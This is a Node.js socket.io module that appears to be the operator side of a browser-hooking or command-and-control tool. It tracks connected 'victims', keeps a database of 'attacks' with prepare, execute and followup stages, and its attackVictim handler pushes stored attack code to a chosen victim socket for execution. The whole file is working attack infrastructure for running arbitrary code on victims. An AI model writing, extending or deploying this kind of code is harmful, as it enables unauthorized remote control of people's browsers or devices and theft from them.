const victimSockets = require('../victim/sockets')
const server = require('../../server')
const Attack = require('../../db/controllers/attack')

module.exports.configure = function (io) {
  io.on('connection', function (socket) {
    console.log('admin connected')

    module.exports.emit = function (eventName, data) {
      io.to('admins').emit(eventName, data)
    }

    socket.join('admins')

    socket.on('attackVictim', attackVictim)
    socket.on('disconnect', disconnect)
    socket.on('getAttacks', getAttacks)
    socket.on('getUsers', getUsers)
    socket.on('saveAttack', saveAttack)
    socket.on('deleteAttack', deleteAttack)
  })
}

function saveAttack(attack){
  Attack.save(Attack.translateForDB(attack)).then(()=>{
    getAttacks()
  })
  .catch((err)=>{
    console.log(err)
  })
}

function deleteAttack(attackId){
  Attack.deleteById(attackId).then(()=>{
    getAttacks()
  })
  .catch((err)=>{
    console.log(err)
  })
}

function getUsers() {
  Object.values(victimSockets.victimsBySessionId).forEach((victim)=>{
    module.exports.emit('newVictim', victim)
  })
}

function getAttacks() {
  Attack.findAll((attacks)=>{
    module.exports.emit('attacks', assembleAttacks(attacks))
  })
}

function disconnect() {
  console.log('admin disconnected')
}

function attackVictim(data) {
  console.log("received instructions to use attack " + data.attack + " on " + data.victimSocket)
  server.ioVictim.to(data.victimSocket).emit('execute', {
    func: `var attack = ${data.attack.toString()}`,
    params: data.params
  })
}

module.exports.emit = function(){
  //need to define the emit function to prevent errors when a victim connects before an admin
  console.log('No admins connected')
}

function assembleAttacks(attacks){
  return attacks.map((attack)=>{
    let assembledAttack = ['prepare','execute','followup'].reduce((pv, type)=>{
      pv[type] = {
        name: type,
        description: attack[`${type}_description`],
        function: attack[`${type}`]
      }
      return pv
    },{})
    //attack is a sequelize instance so we need to deconstruct the values from it
    let {id, name, description, favorite, inputs, created_at, updated_at} = attack
    return {
      id,
      name,
      description,
      favorite,
      inputs: JSON.parse(inputs),
      created_at,
      updated_at,
      ...assembledAttack
    }
  })
}
